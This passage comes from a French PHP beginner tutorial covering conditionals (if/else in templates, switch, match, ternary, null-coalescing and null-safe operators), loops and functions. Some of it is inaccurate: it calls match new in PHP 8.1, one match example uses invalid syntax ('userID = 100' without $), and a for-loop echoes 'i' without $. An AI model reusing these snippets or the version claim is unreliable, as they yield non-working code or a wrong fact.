  &lt;a href="#utiliser-les-if-dans-un-fichier-html"&gt;
  &lt;/a&gt;
  Utiliser les 'if' dans un fichier HTML
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;html&lt;/span&gt; &lt;span class="na"&gt;lang=&lt;/span&gt;&lt;span class="s"&gt;"en"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
    &lt;span class="cp"&gt;&amp;lt;?php $isAdmin = true; ?&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Home page&lt;span class="nt"&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

    &lt;span class="cp"&gt;&amp;lt;?php if ($isAdmin) : ?&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Welcome Administrator&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
    &lt;span class="cp"&gt;&amp;lt;?php else : ?&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Welcome Guest&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
    &lt;span class="cp"&gt;&amp;lt;?php endif ?&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Chaque bloc de code PHP a une balise d’ouverture et de fermeture. La particularité ici c’est le bloc de code du &lt;strong&gt;if&lt;/strong&gt; et du &lt;strong&gt;else&lt;/strong&gt; . Il n’y a pas { }. Il est possible d’utiliser les : à la place.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#switch"&gt;
  &lt;/a&gt;
  Switch
&lt;/h3&gt;

&lt;p&gt;Si nous avons plusieurs conditions, les 'if', 'elseif' etc.. peuvent donner un code difficile à lire. Dans ce cas l’instruction 'switch' permet justement d’aider à simplifier votre code.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$color&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s1"&gt;'red'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Danger'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
         &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s1"&gt;'yellow'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Warning'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s1"&gt;'green'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Success'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'The color is unknown'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;La première ligne représente l’expression que nous désirons évaluer : switch($color)&lt;/p&gt;

&lt;p&gt;Ensuite suffit d’inclure les “case” possible.&lt;/p&gt;

&lt;p&gt;La fonction “break” empêche l’exécution de continuer&lt;/p&gt;

&lt;p&gt;Le “case” default est utilisé s'il y a aucun case qui correspond.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#match"&gt;
  &lt;/a&gt;
  Match
&lt;/h3&gt;

&lt;p&gt;Nouveauté PHP 8.1, cette instruction permet de retourner une expression selon une correspondance clé ⇒valeur&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$color&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;'red'&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'danger'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;'yellow'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'orange'&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'warning'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;'green'&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'success'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'Unknown'&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;La première ligne représente l’expression que nous désirons vérifier la correspondance: &lt;strong&gt;match&lt;/strong&gt;($color)&lt;/p&gt;

&lt;p&gt;Sur la deuxième ligne on remarque qu’il est possible de correspondre plus d’une expression à la fois.&lt;/p&gt;

&lt;p&gt;Ensuite s’en suit une liste de &lt;strong&gt;clé&lt;/strong&gt; ⇒ &lt;strong&gt;valeur&lt;/strong&gt;. Si aucune &lt;strong&gt;clé&lt;/strong&gt;→&lt;strong&gt;valeur&lt;/strong&gt; n’est trouvé, la clé &lt;strong&gt;default&lt;/strong&gt; sera exécutée.&lt;/p&gt;

&lt;p&gt;À noter que la clé peut être une expression et que la valeur peut être également, une expression et même une fonction.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$color&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;userID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;openAdmin&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
    &lt;span class="n"&gt;userID&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;userID&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;openUser&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
    &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;openOther&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#switch-ou-match-"&gt;
  &lt;/a&gt;
  Switch ou Match ?
&lt;/h3&gt;

&lt;p&gt;Chacun possède des plus. &lt;strong&gt;Match&lt;/strong&gt; est plus simple visuellement mais &lt;strong&gt;Switch&lt;/strong&gt; permet d’exécuter plus d’une ligne de code pour chaque “case”. &lt;strong&gt;Match&lt;/strong&gt; permet de retourner une valeur ce que &lt;strong&gt;Switch&lt;/strong&gt; ne fait pas. Bref moi j’utilise &lt;strong&gt;Match&lt;/strong&gt; si possible car je trouve l’instruction plus épurée visuellement mais sinon je n'ai pas de problème avec l’instruction &lt;strong&gt;switch&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#ternary-operator-"&gt;
  &lt;/a&gt;
  Ternary operator  ?:
&lt;/h3&gt;

&lt;p&gt;C’est une syntaxe raccourcie pour un if...else. &lt;/p&gt;

&lt;p&gt;Voici un exemple avec if...else&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$isValid&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'user valid'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'user not valid'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Voici le même exemple mais avec l’opérateur Ternary&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$isValid&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="s1"&gt;'user valid'&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'user not valid'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Si l’expression qui précède L’opérateur “?” est vraie alors la valeur suivant “?” sera utilisé, sinon c’est la valeur suivant les “:” qui sera utilisé.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#lop%C3%A9rateur-de-coalescence-null-"&gt;
  &lt;/a&gt;
  L'opérateur de coalescence Null ??
&lt;/h3&gt;

&lt;p&gt;L'opérateur de coalescence Null renvoie son premier opérande s'il existe et n'est pas NULL ; sinon il renvoie son deuxième opérande&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;??&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;//output 'Mike' if $name is null&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#assignation-avec-lop%C3%A9rateur-de-coalescence-null-"&gt;
  &lt;/a&gt;
  Assignation avec l'opérateur de coalescence Null ??
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;??=&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Assigne la valeur ‘Mike’ si la variable $name est null&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#op%C3%A9rateur-null-safe"&gt;
  &lt;/a&gt;
  Opérateur Null safe
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$user&lt;/span&gt;&lt;span class="o"&gt;?-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;profile&lt;/span&gt;&lt;span class="o"&gt;?-&amp;gt;&lt;/span&gt;&lt;span class="nf"&gt;activate&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Si une des variables qui précède l’opérateur “?” est null alors la valeur de l’expression sera null&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#les-boucles"&gt;
  &lt;/a&gt;
  Les boucles
&lt;/h1&gt;

&lt;h3&gt;
  &lt;a href="#la-boucle-while"&gt;
  &lt;/a&gt;
  La boucle “while”
&lt;/h3&gt;

&lt;p&gt;Permet d’exécuter un block de code un certain nombre de fois. Le nombre de fois va dépendre de la condition. Tantque la condition est vrai, le block de code va s’exécuter.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'value : '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici le bloc de code sera exécuté 9 fois.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#la-boucle-do-while"&gt;
  &lt;/a&gt;
  La boucle “do while”
&lt;/h3&gt;

&lt;p&gt;Essentiellement le même principe que la boucle “while” mais dans ce cas-ci, le bloc de code va toujours s’exécuter au moins une fois. La condition étant testé seulement à la fin du bloc de code.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'value : '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#la-boucle-for"&gt;
  &lt;/a&gt;
  La boucle “for”
&lt;/h3&gt;

&lt;p&gt;Permet d’exécuter un bloc de code un nombre de fois définit par une condition.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"i value = "&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Le paramètre se divise en trois sections, le première étant la définition du compteur (i = 0). Ensuite la condition à respecter pour exécuter le bloc de code ($i &amp;lt; 20)  et enfin le code à exécuter à chaque itération ($i++)&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#la-boucle-foreach"&gt;
  &lt;/a&gt;
  La boucle “foreach”
&lt;/h3&gt;

&lt;p&gt;La fonction foreach permet d’exécuter un bloc de code pour chaque élément d’un tableau.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$names&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Shawn'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'John'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="k"&gt;foreach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$names&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Le premier paramètre c’est le nom du tableau à parcourir, le second paramètre représente la référence à l’élément en cours.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#break-et-continue"&gt;
  &lt;/a&gt;
  Break et Continue
&lt;/h3&gt;

&lt;p&gt;Les instructions break et continue permettent de modifier la boucle&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;'&amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Cette boucle va imprimer la valeur de $i, seulement lorsque la valeur sera impaire.&lt;/p&gt;

&lt;p&gt;Si la valeur est paire ($i % 2 === 0). Alors on demande à la boucle de faire un &lt;strong&gt;continue&lt;/strong&gt; avec la prochaine valeur.&lt;/p&gt;

&lt;p&gt;Il est possible de sortir de la boucle à tout moment avec l’instruction &lt;strong&gt;break&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;10000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;'&amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici la boucle va s’arrêter lorsque $i aura 10 comme valeur&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#les-fonctions"&gt;
  &lt;/a&gt;
  Les fonctions
&lt;/h1&gt;

&lt;p&gt;En PHP il existe plusieurs fonctions déjà pré-définit. Il est également possible de créer nos propres fonctions. &lt;/p&gt;

&lt;p&gt;Les fonctions permettent d’éviter de répéter notre code plusieurs fois. Elles permettent également de diviser notre application en petit morceau plus facile à maintenir.&lt;/p&gt;

&lt;p&gt;La syntaxe pour créer une fonction est assez simple&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello World'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici nous utilisons le mot-clé “function” suivit du nom de notre fonction.&lt;/p&gt;

&lt;p&gt;Une fois notre fonction créée, il est possible de lancer son exécution&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Il est possible d’inclure un ou des paramètres notre fonction&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$firstName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello'&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$firstName&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Le lancement de la fonction devra inclure les paramètres dans l’ordre qu’ils ont été déclarés&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Taylor'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Une valeur par défaut peut-être attribué à un paramètre ce qui du coup rendra se paramètre optionnel lors de l’appel de la fonction.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$firstName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'none'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello'&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$firstName&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// Mike none&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



